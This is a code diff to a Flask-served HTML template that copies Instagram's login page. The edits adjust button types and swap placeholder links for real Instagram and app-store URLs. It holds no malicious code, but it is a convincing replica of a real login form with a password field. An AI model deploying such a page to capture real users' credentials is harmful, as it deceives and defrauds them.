@@ -8,8 +8,8 @@
     <!-- FAVIVON -->
     <link rel="shortcut icon" href="{{ url_for('static', filename='images/favicon.png') }}" type="image/png">
     <!-- GOOGLE FONT -->
-    <link rel="preconnect" href="https://fonts.gstatic.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <!-- <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet"> -->
     <!-- APP CSS -->
     <link rel="stylesheet" href="{{ url_for('static', filename='app.css') }}">
 </head>
@@ -50,7 +50,7 @@
                                             Password
                                         </span>
                                         <input name="password" type="password">
-                                        <button>Show</button>
+                                        <button type="button">Show</button>
                                     </div>
                                 </div>
                                 <div class="btn-group">
@@ -64,7 +64,7 @@
                                     <div></div>
                                 </div>
                                 <div class="btn-group">
-                                    <button class="btn-fb">
+                                    <button class="btn-fb" type="button">
                                         <img src="{{ url_for('static', filename='images/facebook-icon.png') }}" alt="">
                                         <span>Log in with Facebook</span>
                                     </button>
@@ -77,17 +77,17 @@
                     <div class="box goto">
                         <p>
                             Don't have an account?
-                            <a href="#">Sign up</a>
+                            <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                         </p>
                     </div>
 
                     <div class="app-download">
                         <p>Get the app.</p>
                         <div class="store-link">
-                            <a href="#">
+                            <a href="https://apps.apple.com/us/app/instagram/id389801252">
                                 <img src="{{ url_for('static', filename='images/app-store.png') }}" alt="app store">
                             </a>
-                            <a href="#">
+                            <a href="https://l.instagram.com/?u=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.instagram.android%26referrer%3Dutm_source%253Dinstagramweb%2526utm_campaign%253DloginPage%2526ig_mid%253DEF792B7B-AD21-40BA-9592-C3DE8CECD0C8%2526utm_content%253Dlo%2526utm_medium%253Dbadge&e=AT0ny0FOpkxqIKvBE323pBPFXELcTSuEQYb67QqzCZawPBqelvHMGAHiZ1hVzHZu3NTr_Mc9sbQtK0P2NcotSYdXyveLTjQI4-XaMgU-P6MZNLyVz9iQTVcIitAKFOTkONN1y98IV_arlG2taAYYdA">
                                 <img src="{{ url_for('static', filename='images/gg-play.png') }}" alt="google play">
                             </a>
                         </div>
@@ -97,16 +97,16 @@
         </div>
         <div class="footer">
             <div class="links">
-                <a href="#">About</a>
-                <a href="#">Blog</a>
-                <a href="#">Jobs</a>
-                <a href="#">Help</a>
-                <a href="#">API</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-                <a href="#">Top Accounts</a>
-                <a href="#">Hashtags</a>
-                <a href="#">Locations</a>
+                <a href="https://about.instagram.com/">About</a>
+                <a href="https://about.instagram.com/blog/">Blog</a>
+                <a href="https://www.instagram.com/about/jobs/">Jobs</a>
+                <a href="https://help.instagram.com/">Help</a>
+                <a href="https://developers.facebook.com/docs/instagram">API</a>
+                <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
+                <a href="https://www.instagram.com/legal/terms/">Terms</a>
+                <a href="https://www.instagram.com/directory/profiles/">Top Accounts</a>
+                <a href="https://www.instagram.com/explore/locations/">Locations</a>
+                <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
                 <a href="#" id="darkmode-toggle">Darkmode</a>
             </div>
             <div class="copyright">
